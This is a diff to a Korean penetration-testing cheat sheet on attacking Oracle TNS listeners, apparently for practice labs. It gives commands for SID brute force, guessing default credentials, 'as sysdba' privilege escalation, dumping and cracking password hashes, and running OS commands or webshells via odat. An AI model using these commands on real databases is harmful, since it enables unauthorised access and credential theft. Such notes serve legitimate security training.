@@ -2,7 +2,7 @@
 
 # Oracle TNS (1521)
 
-Oracle 데이터베이스의 네트워크 접속 계층. TNS Listener(기본 1521)가 접속 요청을 받아 DB 인스턴스로 넘긴다. 접속하려면 인스턴스를 가리키는 SID 또는 Service Name 을 알아야 해서, 공격은 보통 SID 열거부터 시작한다. 기본 자격증명과 odat 를 통한 파일 읽기/쓰기, OS 명령 실행이 주요 벡터.
+Oracle 데이터베이스의 네트워크 접속 계층. TNS(Transparent Network Substrate)는 통신 프로토콜이고, 1521 에서 요청을 받는 서비스는 TNS Listener(Oracle Net Listener)다. 리스너가 요청을 받아 DB 인스턴스로 넘긴다. 접속하려면 인스턴스를 가리키는 SID 또는 Service Name 을 알아야 해서, 공격은 보통 SID 열거부터 시작한다. 기본 자격증명, as sysdba 설정 오류, odat 를 통한 파일 읽기/쓰기와 OS 명령 실행이 주요 벡터.
 
 ---
 
@@ -11,7 +11,7 @@ Oracle 데이터베이스의 네트워크 접속 계층. TNS Listener(기본 152
 TNS 는 인증 없이도 버전과 상태를 어느 정도 뱉는다. SID 를 모르면 접속 자체가 안 되므로, 버전 확인과 SID 브루트포스를 먼저 한다.
 
 ```bash
-# odat 다운로드
+# odat 설치
 sudo apt install odat -y
 
 # nmap - 버전과 SID
@@ -37,8 +37,8 @@ odat sidguesser -s <IP> -p 1521
 # nmap
 nmap -p 1521 --script=oracle-sid-brute <IP>
 
-# hydra (sid 사전 직접 지정)
-hydra -L /usr/share/wordlists/sids.txt -s 1521 <IP> oracle-sid
+# hydra (odat 내장 SID 사전 사용)
+hydra -L /usr/share/odat/resources/sids.txt -s 1521 <IP> oracle-sid
 ```
 
 ---
@@ -51,6 +51,10 @@ SID 를 찾으면 그 SID 대상으로 계정을 때린다. Oracle 은 기본 �
 # odat passwordguesser (SID 지정)
 odat passwordguesser -s <IP> -p 1521 -d <SID>
 odat passwordguesser -s <IP> -p 1521 -d <SID> --accounts-file accounts.txt
+
+# 내장 계정 사전 경로
+#   /usr/share/odat/accounts/accounts.txt
+#   /usr/share/odat/accounts/accounts_small.txt   (빠른 테스트용)
 
 # 자주 먹히는 기본 계정
 #   scott/tiger
@@ -76,6 +80,19 @@ sqlplus <user>/<password>@<IP>:1521/<SID> as sysdba
 # 자주 보는 에러
 #   ORA-12514 : SID/Service Name 이 틀림 (리스너가 그 인스턴스를 모름)
 #   ORA-01017 : 사용자명/비밀번호 틀림
+#   ORA-12543 : 호스트에 못 닿음 (타겟 다운/랩 만료/IP 변경 확인)
+```
+
+### as sysdba 권한 승격 (설정 오류 시)
+
+가끔씩 권한 설정이 잘못된 Oracle DB 에서는 저권한 계정으로도 `as sysdba` 를 붙이면 SYS 권한으로 접속된다. 정상 설정이면 SYSDBA 롤이 없는 계정은 거부되지만, 롤이 잘못 부여됐거나 원격 SYSDBA 접속이 열려 있으면 그대로 통과한다. 일반 접속에서 sys.user$ 가 ORA-00942 로 막히면 이 경로를 시도한다.
+
+```bash
+# 일반 접속 - 저권한. sys.user$ 읽기 막힘 (ORA-00942)
+sqlplus <user>/<password>@<IP>:1521/<SID>
+
+# as sysdba 접속 - SYS 권한. 내부 테이블 읽힘
+sqlplus <user>/<password>@<IP>:1521/<SID> as sysdba
 ```
 
 ---
@@ -92,9 +109,10 @@ SELECT user FROM dual;
 SELECT * FROM user_role_privs;          -- DBA 롤 있으면 사실상 장악
 SELECT * FROM session_privs;
 
--- 계정과 비밀번호 해시 (DBA 권한 필요)
-SELECT name, password FROM sys.user$;
-SELECT name, spare4 FROM sys.user$;     -- 11g+ SHA 해시
+-- 계정과 비밀번호 해시 (DBA 권한 또는 as sysdba 필요)
+SELECT name, password FROM sys.user$;                       -- 11g 이하 DES 해시
+SELECT name, password FROM sys.user$ WHERE name = '<user>'; -- 특정 계정만
+SELECT name, spare4 FROM sys.user$;                         -- 11g+ SHA 해시
 
 -- 테이블 둘러보기
 SELECT table_name FROM all_tables;
@@ -133,5 +151,6 @@ odat dbmsscheduler -s <IP> -d <SID> -U <user> -P <password> --sysdba --exec "cmd
 
 - SID 를 못 구하면 그 어떤 자격증명도 못 쓴다. 열거 1순위는 SID 다
 - 기본 계정(scott/tiger, system/manager)이 실전과 연습 모두에서 자주 살아 있다
+- 일반 접속에서 sys.user$ 가 막히면 같은 계정에 as sysdba 를 붙여 다시 시도할 것 (설정 오류 시 통과)
 - DBA 롤이 보이면 odat utlfile 로 웹셸을 써서 바로 RCE 로 넘어가는 게 Windows 타겟의 흔한 경로다
-- 해시를 뽑으면 hashcat 으로 크랙한다 (Oracle 11g+ 는 모드 112, 구형 DES 는 모드 3100)
+- 해시를 뽑으면 hashcat 으로 크랙한다 (11g 이하 DES 는 모드 3100, 11g+ SHA 는 모드 112)
